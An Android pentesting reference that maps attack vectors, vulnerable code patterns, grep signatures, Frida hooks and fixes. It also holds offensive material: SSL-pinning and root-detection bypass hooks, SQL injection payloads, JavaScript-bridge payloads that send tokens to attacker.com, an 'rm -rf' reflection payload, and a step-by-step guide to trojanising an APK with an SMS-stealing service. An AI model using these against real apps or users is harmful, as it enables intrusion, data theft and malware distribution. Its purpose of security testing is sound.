# Android Attack Patterns Reference

Comprehensive reference for Android attack patterns, vulnerability signatures, and source-to-sink tracing methodology.

---

## 1. OWASP Mobile Top 10 (2024) Quick Reference

> **See [OWASP Mobile Top 10 classification](reporting-templates.md#owasp-mobile-top-10-categories-reference-2024) in reporting-templates.md for the complete classification table.**

---

## 2. Source-to-Sink Tracing Master Guide

### Common Sources (Attacker-Controlled Input)

| Source | Java Method | Risk |
|--------|-------------|------|
| Intent extras | `getStringExtra()`, `getIntExtra()`, `getParcelableExtra()` | Deep link params, exported components |
| Deep link data | `getIntent().getData()`, `getQueryParameter()` | URL parameters, path segments |
| Clipboard | `ClipboardManager.getPrimaryClip()` | Pasted sensitive data |
| File reads | `FileInputStream`, `openFileInput()` | Malicious file URIs |
| WebView bridge | `@JavascriptInterface` methods | JS-injected data |
| Activity result | `onActivityResult()` data | Malicious app response |
| Provider query | `query()` parameters | SQL injection |
| Broadcast | `onReceive()` intent | Malicious broadcast data |
| NFC | `NdefMessage`, `Tag` | NFC tag data |

### Common Sinks (Where Values Become Dangerous)

| Sink | Java Method | Attack |
|------|-------------|--------|
| WebView URL | `loadUrl()`, `loadData()`, `evaluateJavascript()` | XSS, file access |
| Code execution | `Runtime.exec()`, `ProcessBuilder` | Command injection |
| File write | `FileOutputStream`, `openFileOutput()` | Arbitrary file write |
| SQL query | `execSQL()`, `rawQuery()`, `query()` | SQL injection |
| Network | `HttpURLConnection`, `OkHttpClient` | SSRF, data exfiltration |
| Crypto | `Cipher.init()` with user key | Key derivation flaws |
| IPC forward | `startActivity()` with user-controlled intent | Intent redirection |
| Reflection | `Class.forName()`, `getMethod()`, `invoke()` | Dynamic code loading |

### Propagation Patterns

1. **Direct**: source → variable → sink (simplest)
2. **Method call**: source → method(arg) → return → sink
3. **Collection**: source → Map/List → iterator → sink
4. **Async**: source → Handler/AsyncTask/Coroutine → sink
5. **Serialization**: source → Parcelable → getParcelableExtra → sink
6. **Storage**: source → SharedPreferences/DB → read later → sink (second-order)
7. **Callback**: source → interface implementation → sink

### Decision Rules

1. **Direct source-to-sink, no check** → **Confirmed**
2. **Check exists** → Read fully; bypassable → **Confirmed**, not bypassable → discard
3. **Sink in helper** → Locate ALL callers, trace each one
4. **Cross-class path** → Read EVERY class in chain before writing
5. **Hardcoded-only** → No attacker control → **discard**
6. **Blocked by obfuscation/reflection/native** → **Needs Dynamic Confirmation**
7. **Second-order** → Trace full lifecycle, write as separate finding
8. **Conditional** → Note conditions in finding (API level, device state)

---

## 3. Modern Attack Vectors (2024-2025)

### Deep Link Hijacking
- **Attack**: Malicious app registers same custom URI scheme
- **Impact**: Token theft, account takeover, data exfiltration
- **Detection**: Custom scheme without `autoVerify`, missing host validation
- **Mitigation**: Use App Links with `android:autoVerify="true"`

### Task Hijacking (StrandHogg)

**Attack:** Malicious app sets `taskAffinity` to victim's package, causing victim activities to run in attacker task context.

**Impact:** UI spoofing, credential theft, data exfiltration, bypass of security checks.

**CVE:** CVE-2021-33699 (patched 2021-11-01)

**Variants:**
- **StrandHogg 1.0**: Basic task affinity hijacking
- **StrandHogg 2.0**: Native code injection via `android:taskReparenting`

**Detection:**
```bash
# Check for vulnerable taskAffinity in manifest
grep -E 'taskAffinity="[^"]+' AndroidManifest.xml | grep -v package

# Frida hook to detect task hijacking
Java.perform(function() {
    var Activity = Java.use('android.app.Activity');
    Activity.prototype.onNewIntent.implementation = function(intent) {
        var task = this.getTask();
        console.log('[Task Hijacking] onNewIntent in task: ' + task.getId());
        // Verify task ownership
        this.onNewIntent(intent);
    };
});
```

**Mitigation:**
1. Set `taskAffinity` to package name only
2. Use `android:taskAffinity=""` for isolated activities
3. Implement `onNewIntent` validation
4. Verify task ownership with `getTask().getId()`

### Tapjacking

**Attack:** Transparent overlay intercepts touch events meant for underlying UI elements.

**Impact:** Unauthorized permission grants, malicious app installations, financial transaction hijacking.

**Variants:**

| Variant | Mechanism | Android Affected | CVSS |
|---------|-----------|-----------------|------|
| **Classic** | Window overlays (`SYSTEM_ALERT_WINDOW`) | All | 6.5 |
| **TapTrap** | Animation-driven (bypasses defenses) | Android 13+ | 8.2 |

**TapTrap Details (USENIX Security 2025):**
- Uses Android animation system to bypass `filterTouchesWhenObscured`
- Transparent activities with animations capture taps
- No overlay permission required
- All existing tapjacking defenses ineffective

**Detection:**
```bash
# Check for missing protections in manifest
grep -E "filterTouchesWhenObscured|FLAG_SECURE" AndroidManifest.xml

# Frida hook for overlay detection
Java.perform(function() {
    var Window = Java.use('android.view.Window');
    Window.prototype.setFlags.implementation = function(flags, mask) {
        if (mask & 0x8000) { // FLAG_SECURE
            console.log('[Tapjacking] FLAG_SECURE check');
        }
        this.setFlags(flags, mask);
    };
});
```

**Mitigation:**
1. `android:filterTouchesWhenObscured="true"` on sensitive views
2. `FLAG_SECURE` on sensitive activities
3. `setRecentsScreenshotEnabled(false)` 
4. Biometric auth for sensitive actions
5. For TapTrap: Security-aware touch handling, delay-sensitive actions

### PendingIntent Injection
- **Attack**: Malicious app modifies mutable PendingIntent
- **Impact**: Execute arbitrary actions as victim app
- **Detection**: `PendingIntent` without `FLAG_IMMUTABLE` (Android 12+)
- **Mitigation**: Always use `FLAG_IMMUTABLE`

### Content Provider SQL Injection
- **Attack**: SQL injection via `query()` selection or projection
- **Impact**: Data extraction from app database
- **Detection**: Concatenated SQL strings in `query()`, `rawQuery()`, `execSQL()`
- **Mitigation**: Use `selectionArgs` parameterization

### Content Provider Path Traversal
- **Attack**: `../../../` traversal in `openFile()` URI
- **Impact**: Arbitrary file read from app sandbox
- **Detection**: `openFile()`/`openAssetFile()` without path validation
- **Mitigation**: Canonicalize path, validate against allowed directories

### Firebase Misconfiguration
- **Attack**: Unauthenticated Firebase database/storage access
- **Impact**: Full data read/write
- **Detection**: `firebaseio.com` URLs in code, missing security rules
- **Mitigation**: Security rules, authenticated access only

### WebView JavaScript Interface
- **Attack**: JS bridge methods accessible from untrusted web content
- **Impact**: File access, data theft, code execution (API < 17)
- **Detection**: `addJavascriptInterface()` with sensitive method exposure
- **Mitigation**: Remove interfaces, validate URL, minimum API 17

### Biometric Auth Bypass
- **Attack**: Frida hook skips `BiometricPrompt` callback
- **Impact**: Access protected functionality without biometric
- **Detection**: `BiometricPrompt` without `CryptoObject`, UI-only check
- **Mitigation**: Use `CryptoObject` with KeyStore-bound key

### Insecure Intent Redirection
- **Attack**: Exported proxy component forwards attacker-controlled nested `Intent`, `Uri`, or grant flags to internal components
- **Impact**: Access private activities/services, exfiltrate `FileProvider` data, or abuse privileged app identity
- **Detection**: `getParcelableExtra()` / `getSerializableExtra()` feeding `startActivity()`, `startService()`, `sendBroadcast()`, `setResult()`, or URI grant flows
- **Mitigation**: Rebuild a new explicit safe intent, validate package/class/action/data, strip `FLAG_GRANT_*`, and reject untrusted `ClipData`
- **Reference**: `intent-injection.md`

---

## 4. Checks That Grep Misses

Always perform manual review for:

1. **Exported activity validation gap**: Checks in `onCreate()` but NOT `onNewIntent()`
2. **Logout flaws**: Session not invalidated on server, token not cleared
3. **Happy path protection**: Auth/authorization checked only on success path
4. **Second-order injection**: Data stored then used unsafely later
5. **Encoded credentials**: XOR, Base64, custom encoding in auth logic
6. **Plaintext after decrypt**: Decrypted data stored/exposed unsafely
7. **Confused deputy**: Implicit intents forwarded to privileged components
8. **Activity result abuse**: `onActivityResult` data from malicious sender
9. **TOCTOU**: Time-of-check-time-of-use in file operations
10. **Authorization UI-only**: Server doesn't enforce what client claims
11. **Nested intent relay**: `Parcelable` / `Serializable` `Intent` forwarded without component and flag validation

---

## 5. Obfuscation Bypass Strategies

### ProGuard/R8
- **Pattern**: Classes renamed to `a.b.c`, methods to single letters
- **Analysis**: Trace by method signatures, string constants, log messages
- **Tool**: `jadx --deobf` for basic naming
- **Look for**: Mapping files in APK, string references that survived

### Custom String Encryption
- **Pattern**: Decrypt function calls with encoded arguments
- **Analysis**: Hook decrypt at runtime with Frida
- **Commands**: `strings app.apk | grep -i "decrypt\|decode"`
- **Runtime**: `Java.use("com.target.StringEncrypt").decrypt.overload(...).implementation = function(e) { return this.decrypt(e); }`

### Packed/Protected APKs
- **Detection**: `apkid app.apk` → shows packer name
- **Patterns**: Small `classes.dex`, large `.so` or encrypted assets, unpacker stubs in native code
- **Bypass**: Dump DEX at runtime with `frida-dexdump`
- **Memory extraction**: Hook `DexFile` or `PathClassLoader`

### Native Code Boundaries
- **When trace hits**: `System.loadLibrary`, `native` method
- **Switch to**: Native analysis with Ghidra/radare2
- **Frida**: `Interceptor.attach(Module.findExportByName("libnative.so", "Java_com_target_Class_method"))`

---

## 6. Additional Attack Patterns

### Shared Preferences Weaknesses
- **Pattern**: Plaintext storage of tokens, session data
- **Detection**: `getSharedPreferences()` with `MODE_PRIVATE` but storing sensitive data
- **Attack**: Rooted device can read XML files from `/data/data/com.package/shared_prefs/`
- **Mitigation**: Use Android Keystore with EncryptedSharedPreferences

### External Storage Exposure
- **Pattern**: Sensitive data written to `/sdcard/` or `getExternalFilesDir()`
- **Detection**: `FileOutputStream` with external paths
- **Attack**: Any app with storage permission can read
- **Mitigation**: Use internal storage (`getFilesDir()`) or encrypt external data

### Insecure SSL/TLS
- **Pattern**: Custom `TrustManager` that accepts all certificates
- **Detection**: `TrustManager` implementations that return `true` in `checkServerTrusted()`
- **Attack**: Man-in-the-middle attacks
- **Mitigation**: Use system trust store, implement certificate pinning

### Weak Random Number Generation
- **Pattern**: Using `java.util.Random` for security-sensitive operations
- **Detection**: `new Random()`, `Math.random()` in crypto contexts
- **Attack**: Predictable values for keys, tokens, nonces
- **Mitigation**: Use `SecureRandom` for cryptographic operations

### Broadcast Receiver Exposure
- **Pattern**: Exported receiver with sensitive actions
- **Detection**: `android:exported="true"` in `<receiver>` without proper permissions
- **Attack**: Malicious apps can trigger actions
- **Mitigation**: Use custom permissions or `exported="false"`

### Service Permission Bypass
- **Pattern**: Exported service with insufficient permission checks
- **Detection**: `android:exported="true"` service accepting intents from any app
- **Attack**: Malicious app binds to service, invokes methods
- **Mitigation**: Custom permissions, signature-level protection, intent filters

### Hardcoded Backup Flag
- **Pattern**: `android:allowBackup="true"` in AndroidManifest
- **Detection**: Manifest declaration allowing backups
- **Attack**: ADB backup extracts app data including databases, shared prefs
- **Mitigation**: Set `allowBackup="false"` or use file-based encryption

### SQL Injection in Content Providers
- **Pattern**: String concatenation in query construction
- **Detection**: `query()` method with `"WHERE " + selection` instead of `selectionArgs`
- **Attack**: SQL injection to read/write provider data
- **Mitigation**: Use parameterized queries with `selectionArgs`

### Dynamic Code Loading
- **Pattern**: `DexClassLoader`, `PathClassLoader` with external DEX
- **Detection**: Loading code from external storage, network, or untrusted sources
- **Attack**: Remote code execution, bypassing Play Store protections
- **Mitigation**: Validate signature of loaded code, whitelist sources

### Root Detection Bypass
- **Pattern**: Client-side root checks only
- **Detection**: Methods checking for `su` binary, busybox, test-keys
- **Attack**: Frida hooks return false, root-hiding apps bypass
- **Mitigation**: Server-side validation, accept that rooted devices can bypass

---

## 7. Signature Patterns for Grep

### Hardcoded Secrets
```bash
# API Keys
grep -ri "api_key\s*=\s*['\"]"
grep -ri "apikey\|apiclient\|client_secret"

# Database credentials
grep -ri "jdbc:mysql://\|postgres://\|mongodb://"

# AWS/Cloud keys
grep -ri "aws_access_key\|aws_secret_access_key\|AKIA[0-9A-Z]{16}"

# Firebase
grep -ri "firebaseio\.com\|firebaseapp\.com"

# Private keys in code
grep -ri "BEGIN PRIVATE KEY\|BEGIN RSA PRIVATE KEY"
```

### Weak Crypto
```bash
# Weak algorithms
grep -ri "Cipher\.getInstance(\"DES\|MD5\|SHA1\|RC4\"
grep -ri "/ECB/PKCS5Padding\|/CBC/NoPadding"

# Hardcoded IV/keys
grep -ri "SecretKeySpec(\s*\".*\""
grep -ri "IvParameterSpec(\s*\".*\""

# Weak RNG
grep -ri "new Random()" | grep -v "SecureRandom"
```

### Insecure Network
```bash
# HTTP usage
grep -ri "http://\|cleartextTrafficPermitted\s*=\s*\"true\""

# Custom TrustManager
grep -ri "class.*implements.*X509TrustManager\|checkServerTrusted.*return true"

# SSL bypass
grep -ri "SSLSocketFactory.*ALLOW_ALL\|hostnameVerifier.*return true"
```

### Debug Info
```bash
# Logging
grep -ri "Log\.[dve]\|System\.out\.println\|printStackTrace"

# Debug flags
grep -ri "BuildConfig\.DEBUG\s*==\s*true"
grep -ri "isDebuggable()\|isSignedWithDebugKey()"
```

### Exported Components
```bash
# From decompiled manifest
grep -ri "exported.*true\|android.intent.action.MAIN\|android.intent.category.LAUNCHER"

# Implicit intents
grep -ri "new Intent(\".*\"|Intent\.ACTION_"
```

---

## 8. Dynamic Testing with Frida

### Common Hooks
```javascript
// Hook WebView
Java.use("android.webkit.WebView").loadUrl.implementation = function(url) {
    console.log("[*] WebView URL: " + url);
    return this.loadUrl(url);
};

// Hook Crypto
Java.use("javax.crypto.Cipher").doFinal.implementation = function(input) {
    console.log("[*] Cipher doFinal: " + bytesToString(input));
    return this.doFinal(input);
};

// Hook SharedPreferences
Java.use("android.content.SharedPreferences$Editor").putString.implementation = function(key, value) {
    console.log("[*] SharedPreferences write: " + key + " = " + value);
    return this.putString(key, value);
};

// Hook Intents
Java.use("android.content.Intent").getStringExtra.implementation = function(key) {
    var result = this.getStringExtra(key);
    console.log("[*] Intent extra: " + key + " = " + result);
    return result;
};

// Hook SQL
Java.use("android.database.sqlite.SQLiteDatabase").execSQL.implementation = function(sql) {
    console.log("[*] SQL exec: " + sql);
    return this.execSQL(sql);
};
```

### Bypass SSL Pinning
```javascript
// OkHttp3
var CertificatePinner = Java.use("okhttp3.CertificatePinner");
CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function(str1, list) {
    console.log("[*] Bypassing OkHttp3 certificate pinning");
    return;
};

// TrustManager
var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
TrustManager.checkServerTrusted.implementation = function(chain, authType) {
    console.log("[*] Bypassing TrustManager check");
    return;
};
```

### Root Detection Hooks
```javascript
// Common root checks
Java.use("java.io.File").exists.implementation = function() {
    var path = this.getAbsolutePath();
    if (path.indexOf("/system/app/Superuser") !== -1 ||
        path.indexOf("/sbin/su") !== -1 ||
        path.indexOf("/system/bin/su") !== -1) {
        console.log("[*] Blocking root check for: " + path);
        return false;
    }
    return this.exists();
};
```

---

## 9. ADB Quick Commands

```bash
# Install APK
adb install app.apk

# Extract APK from device
adb shell pm path com.package.name
adb pull /data/app/com.package.name/base.apk

# View manifest
> **Note**: `aapt` commands are valid for read operations. For build operations, use `aapt2`. See `references/quick-commands.md#tool-version-notes`.
aapt dump badging app.apk
aapt dump xmltree app.apk AndroidManifest.xml

# View shared preferences
adb shell run-as com.package.name cat shared_prefs/prefs.xml

# View database
adb shell run-as com.package.name sqlite3 databases/db.db
.tables
.schema table_name
SELECT * FROM table_name;

# Backup app data
adb backup -noapk com.package.name

# View logcat
adb logcat | grep "package.name"

# Start activity
adb shell am start -n com.package.name/.ActivityName

# Send broadcast
adb shell am broadcast -a com.package.name.ACTION --es key value

# Call content provider
adb shell content query --uri content://com.package.name.provider/table
```

---

## 10. Finding Classification

### Severity Guidelines

**CRITICAL**
- Remote code execution
- Complete authentication bypass
- Full data exposure (all users)
- Privilege escalation to system/root

**HIGH**
- SQL injection on sensitive data
- Intent redirection to exported components
- Plaintext storage of credentials
- SSL pinning bypass (if used for security)

**MEDIUM**
- Local code execution
- Partial data exposure (single user)
- Weak cryptography (if data not highly sensitive)
- Debug features in production

**LOW**
- Information disclosure (non-sensitive)
- Missing rate limiting
- Insecure defaults (no direct exploit)
- Poor code quality (non-security)

**INFO**
- Best practice violations
- Configuration improvements
- Deprecated API usage (non-security)

### Confirmation Requirements

**Confirmed** (write to pipeline_queue.jsonl)
- Full source-to-sink trace completed
- No sanitization/bypass possible
- Tested via static analysis or Frida

**Needs Dynamic Confirmation**
- Path blocked by obfuscation/reflection
- Conditional on runtime state
- Native code boundary reached
- Requires specific device/API level

**Discarded**
- No attacker control (hardcoded-only)
- Sanitization verified as non-bypassable
- Exploitation requires physical access (non-issue for most contexts)
- False positive from grep

---

## 11. Reporting Template

> **Finding report template:** Use the standard template from `references/reporting-templates.md`. Include Severity, Category, Title, Location, Description, Evidence, PoC, Impact, CVSS 4.0 Score, and Recommendations.
---

## 12. SQLite Injection Patterns

SQLite is Android's default database. Unlike server-side SQL injection, mobile SQL injection attacks the local database and can lead to data exfiltration.

### 12.1 Content Provider SQL Injection

Content providers are the primary attack surface for SQLite injection in Android.

**Vulnerable Pattern**:
```java
// VULNERABLE: String concatenation in query
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    String sql = "SELECT * FROM users WHERE name = '" + selection + "'";
    return db.rawQuery(sql, null);
}
```

**Exploitation**:
```bash
# Via ADB
adb shell content query --uri content://com.example.app.provider/users \
  --where "name = 'admin' OR 1=1--'"
```

**Secure Pattern**:
```java
// SECURE: Use parameterized queries
public Cursor query(Uri uri, String[] projection, String selection,
                    String[] selectionArgs, String sortOrder) {
    return db.query("users", projection, "name = ?",
                    new String[]{selection}, null, null, sortOrder);
}
```

### 12.2 Detection Patterns

```bash
# Find rawQuery with concatenation
grep -rn "rawQuery.*+\s*selection\|rawQuery.*+\s*where" --include="*.java"

# Find execSQL with concatenated strings
grep -rn "execSQL.*+\s*\|execSQL.*\"\s*+" --include="*.java"

# Find query with appended strings
grep -rn "\.query.*\"\s*+\s*\|selection.*\s*+" --include="*.java"
```

### 12.3 SQLite Injection Payloads

| Type | Payload | Effect |
|------|---------|--------|
| Auth bypass | `' OR 1=1--'` | Bypasses WHERE clause |
| Data extraction | `' UNION SELECT * FROM users--` | Combines results |
| Schema disclosure | `' UNION SELECT name FROM sqlite_master--` | Lists all tables |
| File read | `' UNION SELECT load_file('/data/data/com.app/databases/db')--` | Reads files |

### 12.4 Content Provider Exported (API < 17)

**Critical**: Before API 17, content providers were exported by default. This means:
- All content providers accessible by any app
- No permission restrictions required
- Direct SQL injection possible via external query

**Detection**:
```xml
<!-- VULNERABLE: No android:exported attribute (defaults to true on API < 17) -->
<provider android:name=".DataProvider" android:authorities="com.app.provider" />

<!-- SECURE: Explicitly set exported=false -->
<provider android:name=".DataProvider"
           android:authorities="com.app.provider"
           android:exported="false" />
```

---

## 13. WebView JavaScript Bridge Attacks

### 13.1 addJavascriptInterface Vulnerability (API < 17)

**Critical vulnerability**: Before API 17 (Jelly Bean 4.2), JavaScript interfaces are accessible from any URL loaded in WebView, allowing remote code execution.

**Vulnerable Code**:
```java
WebView webView = new WebView(this);
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new WebAppInterface(this), "Android");
webView.loadUrl("http://attacker.com/malicious.html");  // Attacker-controlled URL
```

**Malicious JavaScript**:
```javascript
// On attacker-controlled page
function executeMaliciousCode() {
    // Access exposed Java methods
    Android.showToast("Pwned!");

    // RCE via reflection (API < 17)
    var output = Android.getClass().forName("java.lang.Runtime")
        .getMethod("exec", "java.lang.String")
        .invoke(null, "rm -rf /data/data/com.target.app");
    return output;
}

// Execute on page load
executeMaliciousCode();
```

**Frida Detection Script**:
```javascript
Java.perform(function() {
    var WebView = Java.use("android.webkit.WebView");
    WebView.addJavascriptInterface.implementation = function(obj, name) {
        console.log("[!] addJavascriptInterface called");
        console.log("    Interface name: " + name);
        console.log("    Interface object: " + obj.getClass().getName());

        // List all methods exposed
        var methods = obj.getClass().getDeclaredMethods();
        for (var i = 0; i < methods.length; i++) {
            console.log("    Exposed method: " + methods[i].getName());
        }

        return this.addJavascriptInterface(obj, name);
    };
});
```

### 13.2 JavaScript Bridge Attack Surface

**Exposed Methods** provide:
| Access | Example |
|--------|---------|
| File system | `Android.readFile("/data/data/com.app/databases/db")` |
| Intent launching | `Android.startActivity(maliciousIntent)` |
| Data exfiltration | `Android.getAuthToken()` |
| System commands | `Android.executeCommand("whoami")` |

### 13.3 MITM with JavaScript Bridge

If app loads HTTP content and has JavaScript interface:
```bash
# Burp Suite intercept
# Modify response to inject malicious script
<script>
// Access exposed Android interface
Android.getSensitiveData();  // Call exposed method
Android.uploadData('http://attacker.com/collect?data=' + sensitiveData);
</script>
```

### 13.4 Secure Implementation

```java
// SECURE: API 17+ with @JavascriptInterface annotation
public class SecureWebAppInterface {
    @JavascriptInterface  // Only annotated methods are accessible
    public void sendSafeMethod(String data) {
        // Safe operation
    }

    // This method NOT accessible from JS (no annotation)
    public void dangerousMethod() {
        // Internal method
    }
}

// SECURE: Validate URL before loading
if (url.startsWith("https://trusted-domain.com")) {
    webView.loadUrl(url);
} else {
    Log.w(TAG, "Blocked untrusted URL: " + url);
}

// SECURE: Use HTTPS only
webView.getSettings().setMixedContentMode(WebSettings.MIXED_CONTENT_NEVER_ALLOW);
```

---

## 14. APK Infection Methodology

Malware authors commonly infect legitimate APKs. Understanding this helps security researchers identify tampering.

### 14.1 Infection Process

**Step 1: Decompile legitimate APK**
```bash
apktool d legitimate.apk -o legitimate/
jadx -d jadx_output/ legitimate.apk
```

**Step 2: Create malicious payload**
```java
// malware/StealSms.java
public class StealSms extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Steal SMS and send to attacker server
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        // Exfiltrate data...
        return START_STICKY;
    }
}
```

**Step 3: Compile to smali**
```bash
# Compile Java to dex, then convert to smali
javac -source 1.7 -target 1.7 StealSms.java
dx --dex --output=classes.dex StealSms.class
baksmali classes.dex -o malware/
```

**Step 4: Inject into legitimate APK**
```bash
# Copy smali files
cp -r malware/ legitimate/smali/com/malware/

# Register service in AndroidManifest.xml
# Add receiver for SMS_RECEIVED broadcast
```

**Step 5: Modify AndroidManifest.xml**
```xml
<!-- Add inside <application> -->
<service android:name="com.malware.StealSms"
         android:exported="true" />

<receiver android:name="com.malware.SmsReceiver"
           android:exported="true">
    <intent-filter android:priority="1000">
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
    </intent-filter>
</receiver>
```

**Step 6: Rebuild and sign**
```bash
apktool b legitimate/ -o infected.apk
jarsigner -keystore debug.keystore infected.apk androiddebugkey
zipalign -v 4 infected.apk infected-aligned.apk
```

### 14.2 Detection Patterns

**Manifest Analysis**:
```bash
# Look for suspicious services/receivers
grep -E "android:exported=\"true\"" AndroidManifest.xml
grep -E "SMS_RECEIVED|BOOT_COMPLETED|INSTALL_REFERRER" AndroidManifest.xml

# Check for unfamiliar packages
grep -E "android:name=\"/com\." AndroidManifest.xml
```

**Smali Analysis**:
```bash
# Look for suspicious API calls in smali
grep -rn "sendMessage\|http://\|https://\|getSharedPreferences" --include="*.smali"

# Check for BroadcastReceiver implementations
grep -rn "extends BroadcastReceiver" --include="*.smali"
```

**Certificate Verification**:
```bash
# Compare certificate hash with known good version
keytool -printcert -jar-file legitimate.apk
keytool -printcert -jar-file suspicious.apk

# Different certificates = tampered
```

### 14.3 Common Injection Points

| Location | Purpose | Detection |
|----------|---------|-----------|
| Main Activity `onCreate()` | Launch service | Unknown service calls |
| `Application.onCreate()` | Root access | Unknown class in Application |
| SMS/Call receivers | Data theft | High-priority receivers |
| Boot receivers | Persistence | `BOOT_COMPLETED` broadcast |
| Package receivers | Spy on installs | `PACKAGE_ADDED` broadcast |

---

## 15. Cross-Application Scripting

Cross-Application Scripting (XAS) allows malicious apps to inject scripts into vulnerable apps.

### 15.1 Attack Vector

Apps using JavaScript bridges without URL validation:
```java
// VULNERABLE: No validation of loaded URL
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new MyInterface(), "Android");
webView.loadUrl(intent.getData().toString());  // Attacker controls URL
```

**Exploit via Intent**:
```bash
# Malicious app sends intent to vulnerable app
adb shell am start -n com.victim.app/.WebViewActivity \
    -a android.intent.action.VIEW \
    -d "file:///data/data/com.malware/payload.html"
```

**Payload.html**:
```html
<script>
// Access victim's JavaScript bridge
Android.getToken(function(token) {
    // Send to attacker
    var img = new Image();
    img.src = "http://attacker.com/steal?token=" + token;
});
</script>
```

### 15.2 Detection

```bash
# Find JavaScript-enabled WebViews that load external URLs
grep -rn "setJavaScriptEnabled(true)" --include="*.java"
grep -rn "loadUrl.*http\|loadUrl.*file://" --include="*.java"

# Look for getIntent().getData() in WebView activities
grep -rn "getIntent.*getData\|getIntent.*getStringExtra.*url" --include="*.java"
```

---

## 16. Ad Library Vulnerabilities

Third-party ad libraries are a common attack vector due to their broad permissions.

### 16.1 Common Issues

| Vulnerability | Impact |
|---------------|--------|
| Exposed JavaScript interface | RCE if ad SDK uses addJavascriptInterface |
| Excessive permissions | Location, contacts, SMS access |
| Hardcoded API keys | Credential theft |
| Insecure communication | MITM data exfiltration |
| WebView without validation | XSS, arbitrary URL loading |

### 16.2 Detection

```bash
# Find ad SDK packages
grep -rn "com.google.android.gms.ads\|com.admob\|com.facebook.ads" --include="*.java"

# Check permissions used by third-party libs
grep -rn "getSharedPreferences\|getContentResolver\|getSystemService" \
    smali/com/admob/ smali/com/facebook/
```

---

## 17. Advanced Dynamic Testing

### 17.1 Frida for Forensic Data Extraction

```javascript
// Dump all SharedPreferences
Java.perform(function() {
    var Activity = Java.use("android.app.Activity");
    var SharedPreferencesImpl = Java.use("android.app.SharedPreferencesImpl");

    Activity.getSharedPreferences.overload("java.lang.String", "int").implementation = function(name, mode) {
        console.log("[+] SharedPreferences: " + name);
        var prefs = this.getSharedPreferences(name, mode);

        // Dump all keys
        var keys = prefs.getAll().keySet().toArray();
        for (var i = 0; i < keys.length; i++) {
            console.log("    " + keys[i] + " = " + prefs.getString(keys[i], ""));
        }

        return prefs;
    };
});
```

### 17.2 Database Hooking

```javascript
// Monitor all database queries
Java.perform(function() {
    var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");

    SQLiteDatabase.rawQuery.overload("java.lang.String", "[Ljava.lang.String;").implementation = function(sql, args) {
        console.log("[SQL] " + sql);
        if (args != null) {
            for (var i = 0; i < args.length; i++) {
                console.log("    Arg[" + i + "]: " + args[i]);
            }
        }
        return this.rawQuery(sql, args);
    };

    SQLiteDatabase.execSQL.overload("java.lang.String").implementation = function(sql) {
        console.log("[SQL EXEC] " + sql);
        return this.execSQL(sql);
    };
});
```

---

## 18. Content Provider Attack Surface Deep Dive

### 18.1 Querying Exported Providers

```bash
# List all providers
adb shell pm dump com.target.app | grep -A5 "Provider"

# Query provider via content URI
adb shell content query --uri content://com.target.app.provider/users

# Extract specific columns
adb shell content query --uri content://com.target.app.provider/users \
    --projection _id:name:email

# Use WHERE clause
adb shell content query --uri content://com.target.app.provider/users \
    --where "name = 'admin' OR 1=1"
```

### 18.2 Path Traversal in Providers

**Vulnerable Code**:
```java
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String path = uri.getLastPathSegment();  // attacker-controlled
    File file = new File(getContext().getFilesDir(), path);
    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

**Exploit**:
```bash
# Path traversal to read arbitrary files
adb shell content query --uri "content://com.target.app.provider/../../../data/data/com.target.app/shared_prefs/config.xml"
```

**Secure Fix**:
```java
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    String path = uri.getLastPathSegment();

    // Validate path
    if (path.contains("..") || path.contains("/")) {
        throw new SecurityException("Invalid path");
    }

    File file = new File(getContext().getFilesDir(), path);

    // Ensure file is within allowed directory
    String canonicalPath = file.getCanonicalPath();
    if (!canonicalPath.startsWith(getContext().getFilesDir().getCanonicalPath())) {
        throw new SecurityException("Access denied");
    }

    return ParcelFileDescriptor.open(file, ParcelFileDescriptor.MODE_READ_ONLY);
}
```

---

## 19. Reference: OWASP Mobile Top 10 2024 Extended

| M# | Vulnerability | Grep Pattern | Example Finding |
|----|----------------|---------------|-----------------|
| M1 | Improper Credential Usage | `SharedPreferences.*password\|token.*=.*\"[^"]{16,}\|getSharedPreferences.*auth` | Hardcoded credentials in SharedPreferences |
| M2 | Inadequate Supply Chain Security | `implementation.*http://\|mavenCentral\|jitpack\|unversioned` | Unpinned dependency from HTTP repo |
| M3 | Insecure Authentication/Authorization | `SharedPreferences.*auth\|token.*=.*\"` | Token stored without protection |
| M4 | Insufficient Input/Output Validation | `Intent.getStringExtra\|getIntent\(\).getData\|queryParameter` | Intent data without validation |
| M5 | Insecure Communication | `http://\|TrustManager\|X509TrustManager\|ALLOW_ALL\|cleartext` | HTTP API calls without TLS |
| M6 | Inadequate Privacy Controls | `READ_CONTACTS\|READ_SMS\|ACCESS_FINE_LOCATION\|getDeviceId` | Excessive PII collection |
| M7 | Insufficient Binary Protections | `android:debuggable.*true\|ProGuard config missing\|native libs unobfuscated` | Debug build in production |
| M8 | Security Misconfiguration | `exported.*true\|singleTask\|singleInstance\|allowBackup.*true` | Exported activity without permission |
| M9 | Insecure Data Storage | `MODE_WORLD_READABLE\|getExternalFilesDir\|SharedPreferences\|openFileOutput` | Credentials in plaintext storage |
| M10 | Insufficient Cryptography | `DES/\|MD5\|SHA1\|ECB\|SecretKeySpec.*\"` | Weak encryption algorithm |

---

*Last Updated: 2024*
*Reference: Learning Pentesting for Android Devices (Aditya Gupta), OWASP MASTG, OWASP Mobile Top 10 2024*
